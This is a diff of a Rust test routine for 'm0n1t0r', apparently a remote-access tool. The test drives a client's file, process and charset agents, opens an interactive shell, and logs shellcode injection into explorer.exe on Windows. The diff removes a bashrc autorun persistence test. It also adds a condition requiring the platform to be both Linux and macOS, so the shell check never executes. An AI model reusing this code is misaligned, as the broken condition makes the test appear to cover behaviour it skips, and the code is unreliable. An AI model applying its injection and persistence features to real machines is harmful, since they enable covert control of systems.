@@ -3,7 +3,7 @@ use actix_web::web::Buf;
 use anyhow::{Result, anyhow};
 use log::info;
 use m0n1t0r_common::{
-    autorun::Agent,
+    charset::Agent as _,
     client::{Client, TargetPlatform},
     fs::Agent as _,
     process::Agent as _,
@@ -16,7 +16,11 @@ pub async fn run(server: Arc<RwLock<ServerObj>>) -> Result<()> {
     let client = lock_obj.client()?;
     let file_agent = client.fs_agent().await?;
     let process_agent = client.process_agent().await?;
+    let charset_agent = client.charset_agent().await?;
+    let platform = client.target_platform().await?;
+    let shell = client.shell().await?;
 
+    info!("target platform: {:?}", platform);
     client.ping().await?;
     info!("version: {}", client.version().await?);
     info!(
@@ -28,26 +32,24 @@ pub async fn run(server: Arc<RwLock<ServerObj>>) -> Result<()> {
         "Cargo.toml: \"{}\"",
         String::from_utf8_lossy(&file_agent.read("Cargo.toml".into()).await?)
     );
-
-    let (stdin_tx, stdout_rx, _) = process_agent.interactive("sh".to_string()).await?;
-    let mut stdin_tx = stdin_tx.into_inner().await?;
-    let mut stdout_rx = stdout_rx.into_inner().await?;
-    stdin_tx.send("echo hello\n".into()).await?;
-    assert_eq!(
-        "hello\n",
-        String::from_utf8_lossy(
-            stdout_rx
-                .recv()
-                .await?
-                .ok_or(anyhow!("channel closed"))?
-                .chunk()
-        )
-    );
-
-    let platform = client.target_platform().await?;
-    let shell = client.shell().await?;
-    info!("target platform: {:?}", platform);
     info!("target shell: {:?}", shell);
+
+    if platform == TargetPlatform::Linux && platform == TargetPlatform::MacOS {
+        let (stdin_tx, stdout_rx, _) = process_agent.interactive("sh".to_string()).await?;
+        let mut stdin_tx = stdin_tx.into_inner().await?;
+        let mut stdout_rx = stdout_rx.into_inner().await?;
+        stdin_tx.send("echo hello\n".into()).await?;
+        assert_eq!(
+            "hello\n",
+            String::from_utf8_lossy(
+                stdout_rx
+                    .recv()
+                    .await?
+                    .ok_or(anyhow!("channel closed"))?
+                    .chunk()
+            )
+        );
+    }
 
     if platform == TargetPlatform::Windows {
         info!("injecting shellcode into explorer.exe");
@@ -179,17 +181,15 @@ pub async fn run(server: Arc<RwLock<ServerObj>>) -> Result<()> {
                 Vec::new(),
             )
             .await?;
+
+        info!("current acp: {}", charset_agent.acp().await?);
+
+        // Make sure the chinese text "爱" below is encoded in utf8
+        let chinese_love = charset_agent.acp_to_utf8(vec![0xb0, 0xae]).await?;
+        assert_eq!(chinese_love.as_bytes(), "爱".as_bytes());
     }
 
-    if platform != TargetPlatform::General {
-        let autorun_agent = client.autorun_agent().await?;
-        info!("adding current exe to bashrc");
-        autorun_agent.add_current_user().await?;
-        info!("checking result");
-        assert_eq!(autorun_agent.exist_current_user().await?, true);
-        info!("removing autorun");
-        autorun_agent.remove_current_user().await?;
-    }
+    // Not testing autorun due to environment damage
 
     Ok(())
 }
